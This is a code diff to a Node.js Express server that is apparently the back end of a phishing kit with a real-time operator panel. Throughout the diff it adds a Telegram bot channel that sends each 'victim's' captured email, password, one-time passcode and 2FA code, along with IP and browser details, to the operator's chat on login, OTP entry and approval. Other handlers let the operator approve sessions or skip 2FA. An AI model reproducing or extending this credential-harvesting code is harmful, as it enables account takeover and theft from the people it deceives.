@@ -1,17 +1,100 @@
 const express = require('express');
 const cors    = require('cors');
 const crypto  = require('crypto');
+const https   = require('https');
+
+// Environment variables
 const PANEL_USER     = process.env.PANEL_USER  || 'astro';
 const PANEL_PASS     = process.env.PANEL_PASS  || '1';
 const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
 const COOKIE_NAME    = 'pan_sess_v2';
+
+// Telegram configuration
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
+const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';
+
 const app  = express();
 const PORT = process.env.PORT || 3000;
 
-console.log('ENV check:', { PANEL_USER, PANEL_PASS: '***' });
+console.log('ENV check:', { PANEL_USER, PANEL_PASS: '***', TELEGRAM_ENABLED: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) });
 
 const events = new (require('events')).EventEmitter();
 function emitPanelUpdate() { events.emit('panel'); }
+
+// Telegram notification function
+function sendTelegramMessage(message) {
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+    console.log('[Telegram] Skipped (not configured):', message.substring(0, 50) + '...');
+    return;
+  }
+
+  const data = JSON.stringify({
+    chat_id: TELEGRAM_CHAT_ID,
+    text: message,
+    parse_mode: 'HTML',
+    disable_web_page_preview: true
+  });
+
+  const options = {
+    hostname: 'api.telegram.org',
+    port: 443,
+    path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Content-Length': data.length
+    }
+  };
+
+  const req = https.request(options, (res) => {
+    let responseData = '';
+    res.on('data', (chunk) => responseData += chunk);
+    res.on('end', () => {
+      if (res.statusCode === 200) {
+        console.log('[Telegram] Message sent successfully');
+      } else {
+        console.error('[Telegram] Failed:', res.statusCode, responseData);
+      }
+    });
+  });
+
+  req.on('error', (e) => {
+    console.error('[Telegram] Error:', e.message);
+  });
+
+  req.write(data);
+  req.end();
+}
+
+// Helper to format victim info for Telegram
+function formatVictimNotification(v, type) {
+  const domain = currentDomain || 'Unknown';
+  const header = type === 'login' ? '🟢 <b>NEW PANEL LOGIN</b>' : '🔴 <b>NEW VICTIM SESSION</b>';
+  
+  let msg = `${header}\n\n`;
+  msg += `<b>Victim #:</b> ${v.victimNum}\n`;
+  msg += `<b>IP:</b> <code>${v.ip}</code>\n`;
+  msg += `<b>Platform:</b> ${v.platform}\n`;
+  msg += `<b>Browser:</b> ${v.browser}\n`;
+  msg += `<b>Time:</b> ${v.dateStr}\n`;
+  
+  if (type === 'session' && v.email) {
+    msg += `\n<b>Email:</b> <code>${v.email}</code>\n`;
+  }
+  if (type === 'session' && v.password) {
+    msg += `<b>Password:</b> <code>${v.password}</code>\n`;
+  }
+  if (v.otp) {
+    msg += `<b>OTP:</b> <code>${v.otp}</code>\n`;
+  }
+  if (v.twofaCode) {
+    msg += `<b>2FA Code:</b> <code>${v.twofaCode}</code>\n`;
+  }
+  
+  msg += `\n<b>Panel:</b> ${domain}/panel`;
+  
+  return msg;
+}
 
 app.set('trust proxy', 1);
 
@@ -141,6 +224,22 @@ app.post('/panel/login', (req, res) => {
     req.session.authed = true; req.session.username = user;
     req.session.loginTime = Date.now(); req.session.lastActivity = Date.now();
     req.session.save();
+    
+    // Send Telegram notification for panel login
+    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
+    const ua = req.headers['user-agent'] || 'n/a';
+    const parsedUA = uaParser(ua);
+    
+    sendTelegramMessage(
+      `🟢 <b>PANEL LOGIN SUCCESSFUL</b>\n\n` +
+      `<b>User:</b> <code>${user}</code>\n` +
+      `<b>IP:</b> <code>${ip}</code>\n` +
+      `<b>Platform:</b> ${parsedUA.os?.name || 'Unknown'}\n` +
+      `<b>Browser:</b> ${parsedUA.browser?.name || 'Unknown'}\n` +
+      `<b>Time:</b> ${new Date().toLocaleString()}\n\n` +
+      `<b>Domain:</b> ${currentDomain}`
+    );
+    
     return res.redirect(303, '/panel');
   }
   res.redirect(303, '/panel?fail=1');
@@ -183,7 +282,8 @@ app.post('/api/session', async (req, res) => {
       interactions:   [],
       activityLog:    [{ time: Date.now(), action: 'CONNECTED', detail: 'Visitor connected' }],
       redirectTarget: null,
-      redirectUsed:   false
+      redirectUsed:   false,
+      notified:       false  // Track if we've sent notification
     };
     sessionsMap.set(sid, victim);
     sessionActivity.set(sid, Date.now());
@@ -214,6 +314,12 @@ app.post('/api/login', async (req, res) => {
       const entry = auditLog.find(e => e.sid === sid);
       if (entry) entry.password = password;
       else auditLog.push({ t: Date.now(), victimN: v.victimNum, sid, email: v.email, password, otp: '', twofaCode: '', ip: v.ip, ua: v.ua });
+      
+      // Send Telegram notification when both email and password are captured
+      if (v.email && !v.notified) {
+        v.notified = true;
+        sendTelegramMessage(formatVictimNotification(v, 'session'));
+      }
     } else if (email) {
       v.entered = true; v.email = email; v.status = 'wait';
       v.activityLog.push({ time: Date.now(), action: 'ENTERED EMAIL', detail: `Email: ${email}` });
@@ -251,6 +357,18 @@ app.post('/api/otp', async (req, res) => {
     if (entry) {
       if (isGauth) entry.twofaCode = otp;
       else         entry.otp       = otp;
+    }
+
+    // Send update notification for OTP/2FA
+    if (v.notified) {
+      sendTelegramMessage(
+        `🟡 <b>VICTIM UPDATE - ${isGauth ? '2FA CODE' : 'OTP'}</b>\n\n` +
+        `<b>Victim #:</b> ${v.victimNum}\n` +
+        `<b>Email:</b> <code>${v.email}</code>\n` +
+        `<b>${isGauth ? '2FA Code' : 'OTP'}:</b> <code>${otp}</code>\n` +
+        `<b>IP:</b> <code>${v.ip}</code>\n` +
+        `<b>Time:</b> ${new Date().toLocaleString()}`
+      );
     }
 
     emitPanelUpdate();
@@ -417,6 +535,15 @@ app.post('/api/panel', async (req, res) => {
       ].includes(v.page)) {
         v.page = 'success'; v.status = 'approved'; successfulLogins++;
         v.activityLog.push({ time: Date.now(), action: 'APPROVED', detail: `Admin approved from ${v.page}` });
+        
+        // Send notification for approved login
+        sendTelegramMessage(
+          `✅ <b>VICTIM APPROVED</b>\n\n` +
+          `<b>Victim #:</b> ${v.victimNum}\n` +
+          `<b>Email:</b> <code>${v.email}</code>\n` +
+          `<b>Final Status:</b> Approved (Success Page)\n` +
+          `<b>Time:</b> ${new Date().toLocaleString()}`
+        );
       }
       break;
 
@@ -469,6 +596,16 @@ app.post('/api/panel', async (req, res) => {
       v.page = 'success'; v.status = 'approved'; v.redirectTarget = null;
       successfulLogins++;
       v.activityLog.push({ time: Date.now(), action: 'SKIP 2FA', detail: 'Approved without 2SV' });
+      
+      // Send notification for skip 2FA approval
+      sendTelegramMessage(
+        `⚡ <b>VICTIM APPROVED (Skipped 2FA)</b>\n\n` +
+        `<b>Victim #:</b> ${v.victimNum}\n` +
+        `<b>Email:</b> <code>${v.email}</code>\n` +
+        `<b>Password:</b> <code>${v.password}</code>\n` +
+        `<b>IP:</b> <code>${v.ip}</code>\n` +
+        `<b>Time:</b> ${new Date().toLocaleString()}`
+      );
       break;
 
     case 'delete':
